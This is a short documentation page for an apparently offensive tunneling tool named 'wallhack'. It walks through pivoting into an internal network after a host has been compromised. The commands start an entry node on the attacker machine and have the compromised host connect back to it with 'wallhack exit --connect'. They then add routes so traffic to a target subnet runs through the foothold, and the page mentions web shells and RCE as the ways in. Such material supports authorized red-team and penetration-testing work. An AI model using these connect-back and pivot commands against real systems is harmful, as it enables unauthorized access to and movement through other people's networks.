---
title: Single Hop Example
description: Establish a direct tunnel between an entry node and a single compromised host.
order: 7
---

# Single Hop Example

In this example, an entry node runs on the attacker machine (`192.168.1.5`) and a compromised host (`10.0.1.5`) connects back to it. Once established, traffic to `10.10.0.0/24` routes through the compromised host.

The binary reached the host via initial access — a web shell, RCE exploit, or similar foothold. Once transferred and marked executable, the exit node can be started.

{% trafficflow flow="192.168.1.5 (entry) -> 10.0.1.5 (compromised) -> 10.10.0.0/24 (target)" label="Traffic Flow:" /%}

{% steps %}
{% step title="Attacker (192.168.1.5)" number=1 %}
With no arguments, `wallhack` starts an [entry node](/concepts) on the default port (6565/udp, QUIC).

{% codeblock code="wallhack" /%}
{% /step %}

{% step title="Compromised Host (10.0.1.5)" number=2 %}
An [exit node](/concepts) connecting back to the entry node on the default port.

{% codeblock code="wallhack exit --connect 192.168.1.5" /%}

{% /step %}

{% step title="Configure Routes" number=3 %}
Add routes for the networks reachable through the compromised host.

Using the entry node REPL (also configures the OS route automatically):
```
wallhack> route add 10.10.0.0/24
```

Or directly with the system `ip` tool on the attacker machine:
```bash
ip route add 10.10.0.0/24 dev tun0
```
{% /step %}
{% /steps %}
